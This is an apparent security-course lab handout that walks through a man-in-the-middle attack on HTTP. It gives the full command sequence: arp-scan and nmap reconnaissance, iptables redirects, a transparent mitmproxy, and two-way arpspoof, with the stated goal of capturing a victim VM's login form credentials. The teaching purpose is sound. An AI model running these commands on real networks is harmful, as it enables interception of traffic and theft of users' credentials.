## Task 1: MITM Attack on HTTP

Execute the commands below on the attacker's VM (Kali Linux).

We suppose here that the attacker is unaware of information about other hosts, therefore the attacker nedds to gather intelligence on the network first.

### 1.1. Subnet scanning and port scanning

```bash
# scan the entire subnet to find the victim hosts (alice and bob)
# this command lists all online hosts in the subnet
sudo arp-scan --interface=eth0 --localnet

# scan target host ports to find exploitable services
# inspect each target host to find the HTTP server
sudo nmap -sS -sV -O --version-all --reason -p- <target-ip>
```

please record and write down your results, we will use these IP addresses next step. (following is just an example, your VMs' actual IPs may be different)

| Host Role    | IP          | example        |
|--------------|-------------|----------------|
| User (Alice) | <user_ip>   | 192.168.56.101 |
| Server (Bob) | <server_ip> | 192.168.56.102 |

### 1.2. Execute Attack

```bash
# check these tools are installed
which mitmproxy
which arpspoof

# check interface name (should be eth0)
ip -o -4 addr show

sudo sysctl -w net.ipv4.ip_forward=1

# HTTP redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -d <server_ip> --dport 80  -j REDIRECT --to-port 8080
# HTTPS redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -d <server_ip> --dport 443 -j REDIRECT --to-port 8080

# confirm
sudo iptables -t nat -L PREROUTING -n -v --line-numbers | grep <server_ip>

sudo mitmproxy --mode transparent --listen-port 8080 --showhost

# you need 2 new terminal windows concurrently for ARP spoofing
# open a new terminal (terminal A)
sudo arpspoof -i eth0 -t <server_ip> <user_ip>
# open a new terminal (terminal B)
sudo arpspoof -i eth0 -t <user_ip> <server_ip>
```

And then, on the victim VM, open the browser and go to:
- http://victim.com (HTTP)

fill out the simulated login form and submit it, then get back to the attacker's VM (kali linux), if everything is correct, you should be able to capture the login information.
